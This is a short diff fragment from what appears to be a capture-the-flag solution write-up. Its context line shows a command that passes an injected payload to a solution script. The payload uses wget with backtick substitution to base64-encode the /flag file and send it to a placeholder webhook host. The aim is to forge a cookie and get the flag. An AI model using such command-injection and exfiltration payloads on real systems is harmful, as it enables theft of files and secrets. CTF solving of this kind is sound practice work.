@@ -23,4 +23,5 @@ print(f'Cookie: {response.headerlist[1][1]}')
 
 To get flag:
 ```python3 solution-poems.py 'wget webhooklinkhere/?c=`/flag|base64`'```
+
 And then replace the cookie with the output to get the flag.
